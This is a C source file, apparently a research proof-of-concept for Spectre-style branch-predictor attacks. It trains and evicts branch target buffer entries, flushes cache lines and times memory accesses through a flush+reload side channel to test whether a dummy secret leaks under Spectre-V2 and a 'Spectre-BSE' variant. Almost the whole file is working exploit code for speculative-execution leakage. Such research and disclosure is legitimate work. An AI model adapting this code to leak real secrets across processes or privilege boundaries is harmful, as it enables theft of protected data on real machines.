#include <linux/types.h>
#include "jit_utils.h"
#include "c_snippets.h"
#include "sc_utils.h"
#include "inline_asm.h"

void init_btb_targets();
void walk_btb_evset();
void init_env();
void print_result();
void free_env();

#define NR_TEST_ITER 64
#define LEN_BH_CHAIN 8
#define NR_BCOND_TRAIN 512

#define NR_BST_TRAIN 2
#define NR_BTB_EVICT_VICTIM 1
#define SZ_BTB_EVSET 2

__attribute__((aligned(4096)))
uint64_t *res_cycles[NR_TESTS];
trampoline_obj_t *tramp_ret;
trampoline_obj_t *tramp_br;
trampoline_obj_t **tramp_btb_evset;
uint64_t *targets_bh_leak;
uint64_t *targets_bh_safe;
uint64_t *targets_btb_train;
uint64_t **targets_btb_evset;

__attribute__((aligned(4096)))
void *ib_ptr = &t_leak;

__attribute__((aligned(4096)))
static uint64_t offets_btb_victim[NR_BTB_EVICT_VICTIM] = {0x100};
static uint64_t offsets_bh_leak[LEN_BH_CHAIN + 1] = {0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x00, -1};
static uint64_t offsets_bh_safe[LEN_BH_CHAIN + 1] = {0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x100, 0xe0, -1};
static uint64_t offsets_btb_train[NR_BST_TRAIN] = {0x10, 0x20};
static uint64_t btb_evset_base[SZ_BTB_EVSET] = {0x8000000, 0x9000000};
static uint8_t dummy_secret = 12;

branch_chain_t bh_chain_common;

static bh_chain_params_t chain_leak = {
    .bh_chain_p = &bh_chain_common,
    .ib_target = &t_leak,
    .bh_targets_p = &targets_bh_leak,
    .nr_cond_bh = COND_FP_BITS,
    .ib_ptr_p = &ib_ptr,
    .frbuf_p = &frbuf,
    .ptr_secret = &dummy_secret
};

static bh_chain_params_t chain_safe = {
    .bh_chain_p = &bh_chain_common,
    .ib_target = &t_empty,
    .bh_targets_p = &targets_bh_safe,
    .nr_cond_bh = COND_FP_BITS,
    .ib_ptr_p = &ib_ptr,
    .frbuf_p = &frbuf,
    .ptr_secret = &dummy_secret
};

static bh_chain_params_t chain_mispred = {
    .bh_chain_p = &bh_chain_common,
    .ib_target = &t_empty,
    .bh_targets_p = &targets_bh_leak,
    .nr_cond_bh = COND_FP_BITS,
    .ib_ptr_p = &ib_ptr,
    .frbuf_p = &frbuf,
    .ptr_secret = &dummy_secret
};

static bh_chain_params_t *train_passes[2] = {&chain_leak, &chain_safe};

static test_obj_t test_spec_specv2 = {
    .test_spec = TEST_SPEC_V2,
    .nr_test_passes = NR_TEST_ITER,
    .nr_train_passes = 2,
    .nr_trains = 1,
    .trains = (bh_chain_params_t**)train_passes,
    .test = &chain_mispred,
    .before_train = &init_btb_targets,
    .before_test = &t_empty
};

static test_obj_t test_spec_bse_no_ev = {
    .test_spec = TEST_SPEC_NO_BSE,
    .nr_test_passes = NR_TEST_ITER,
    .nr_train_passes = 2,
    .nr_trains = 1,
    .trains = (bh_chain_params_t**)train_passes,
    .test = &chain_safe,
    .before_train = &init_btb_targets,
    .before_test = &t_empty
};

static test_obj_t test_spec_bse = {
    .test_spec = TEST_SPEC_BSE,
    .nr_test_passes = NR_TEST_ITER,
    .nr_train_passes = 2,
    .nr_trains = 1,
    .trains = (bh_chain_params_t**)train_passes,
    .test = &chain_safe,
    .before_train = &init_btb_targets,
    .before_test = &walk_btb_evset
};

// TODO: rename this function
void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void* frbuf, void* ptr_secret)
{
    // Populate BHB with conditional branches
    for (int i = 0; i < nr_cond_bh; i++) NOP(8);
    // Populate PHR with indirect branches and trains the BPU
    br_chain(bh_targets, 0, NULL, ib_ptr_p, frbuf, ptr_secret);
}

// TODO: rename this function
void bst_init(trampoline_obj_t *tramp_br, trampoline_obj_t *tramp_ret, jit_br_and_inc_idx_t *branches, int nr_branches, uint64_t *targets, int64_t nr_targets)
{
    for (int i=0; i<nr_branches; i++)
        for (int j=0; j<nr_targets; j++)
            ((jit_br_and_inc_idx_t)branches[i])(targets, j);
}

// Initialize BST entries so all involved branches update BHB
void init_btb_targets()
{
    bst_init(tramp_br, tramp_ret, (jit_br_and_inc_idx_t *)targets_bh_leak, LEN_BH_CHAIN, targets_btb_train, NR_BST_TRAIN);
    bst_init(tramp_br, tramp_ret, (jit_br_and_inc_idx_t *)targets_bh_safe, LEN_BH_CHAIN, targets_btb_train, NR_BST_TRAIN);
}

void walk_btb_evset()
{
    for (int i = 0; i < SZ_BTB_EVSET; i++)
    {
        bst_init(tramp_btb_evset[i], tramp_ret, (jit_br_and_inc_idx_t *)targets_btb_evset[i], NR_BTB_EVICT_VICTIM, targets_btb_train, NR_BST_TRAIN);
    }
}

void do_spectre_test(test_obj_t test_specs)
{
    uint64_t nr_test_passes = test_specs.nr_test_passes;
    uint64_t nr_train_passes = test_specs.nr_train_passes;
    uint64_t nr_trains = test_specs.nr_trains;
    bh_chain_params_t** trains = test_specs.trains;
    bh_chain_params_t* test = test_specs.test;

    for (int test_iter = 0; test_iter < nr_test_passes; test_iter++)
    {
        for (int train_iter = 0; train_iter<nr_train_passes; train_iter++)
        {
            // Warm-up the BPU
            test_specs.before_train();
            // Train the BPU with desired records
            for (int train_flow = 0; train_flow<nr_trains; train_flow++)
            {
                bh_chain_params_t* current = trains[train_flow];
                void **ib_ptr_p = current->ib_ptr_p;
                void *ib_target = current->ib_target;
                *ib_ptr_p = ib_target;

                branch_chain_t bh_chain = *(current->bh_chain_p);
                uint64_t *bh_targets = *(current->bh_targets_p);
                uint64_t nr_cond_bh = current->nr_cond_bh;
                void *_frbuf = *(current->frbuf_p);
                void *ptr_secret = current->ptr_secret;
                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
            }
        }

        // Massage the BPU to a desired state
        test_specs.before_test();
        void **ib_ptr_p = test->ib_ptr_p;
        void *ib_target = test->ib_target;
        *ib_ptr_p = ib_target;

        // Run the test and see if we can see the desired mis-speculation
        branch_chain_t bh_chain = *(test->bh_chain_p);
        uint64_t *bh_targets = *(test->bh_targets_p);
        uint64_t nr_cond_bh = test->nr_cond_bh;
        char *_frbuf = *(test->frbuf_p);
        char *ptr_secret = test->ptr_secret;

        FLUSH_DCACHE(ib_ptr_p);
        FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, ptr_secret));
        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
        
        // Decode side channel to see if we have made it!
        OPS_BARRIER(0x10);
        
        res_cycles[test_specs.test_spec][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, ptr_secret));
    }
}

int main()
{
    init_env();
    do_spectre_test(test_spec_specv2);
    do_spectre_test(test_spec_bse_no_ev);
    do_spectre_test(test_spec_bse);
    print_result();
    free_env();
    return 0;
}

void init_trampolines()
{
    tramp_ret = prep_trampoline(&jit_ret_obj, &jit_nop_obj, 16, 0, BASE_RET_MEM, 0x1000);
    tramp_br = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, BASE_BHB_POPULATE, 0x1000);
    tramp_btb_evset = malloc(SZ_BTB_EVSET * sizeof(trampoline_obj_t *));
    for (int i = 0; i < SZ_BTB_EVSET; i++)
    {
        tramp_btb_evset[i] = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, (void *)btb_evset_base[i], 0x1000);
    }
}

void compile_br_targets()
{
    targets_bh_leak = prep_jmp_targets(offsets_bh_leak, LEN_BH_CHAIN, *tramp_br);
    targets_bh_leak[LEN_BH_CHAIN] = (uint64_t)&asm_br;
    targets_bh_safe = prep_jmp_targets(offsets_bh_safe, LEN_BH_CHAIN, *tramp_br);
    targets_bh_safe[LEN_BH_CHAIN] = (uint64_t)&asm_br;

    targets_btb_train = prep_jmp_targets(offsets_btb_train, NR_BST_TRAIN, *tramp_ret);
    targets_btb_evset = malloc(SZ_BTB_EVSET * sizeof(uint64_t *));
    for (int i = 0; i < SZ_BTB_EVSET; i++)
    {
        targets_btb_evset[i] = prep_jmp_targets(offets_btb_victim, NR_BTB_EVICT_VICTIM, *tramp_btb_evset[i]);
    }
}

void init_env()
{
    init_frbuf(256, SIZE_CACHE_STRIDE);
    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secret),NR_TEST_ITER);
    for (int i=0; i<NR_TESTS; i++)
    {
        res_cycles[i] = malloc(NR_TEST_ITER * sizeof(uint64_t));
    }

    init_trampolines();
    compile_br_targets();

    bh_chain_common = (branch_chain_t)(tramp_br->jit_mem->call_entry);
}

void print_result()
{
    int sum = 0;
    printf("Memory access latency (average of %d tests): \n", NR_TEST_ITER);
    printf("slow access: %d\n", mem_slow);
    printf("fast access: %d\n", mem_fast);
    printf("\n");

    printf("--- Spectre-V2 ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_V2][round];
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);

    printf("--- without Spectre-BSE ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_NO_BSE][round];
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);

    printf("--- WITH Spectre-BSE ---\n");
    sum = 0;
    for (int round = 0; round < NR_TEST_ITER; round++)
        sum += res_cycles[TEST_SPEC_BSE][round];;
    printf("Probe access latency (average of %d tests): %d\n\n", NR_TEST_ITER, sum / NR_TEST_ITER);
}

void free_env()
{
    free_frbuf();
    for (int i=0; i<NR_TESTS; i++)
    {
        free(res_cycles[i]);
    }

    free(targets_bh_leak);
    free(targets_bh_safe);
    free(targets_btb_train);
    for (int i = 0; i < SZ_BTB_EVSET; i++)
    {
        free(targets_btb_evset[i]);
    }
    free(targets_btb_evset);

    free_trampoline(tramp_ret);
    free_trampoline(tramp_br);
    for (int i = 0; i < SZ_BTB_EVSET; i++)
    {
        free_trampoline(tramp_btb_evset[i]);
    }
    free(tramp_btb_evset);
}
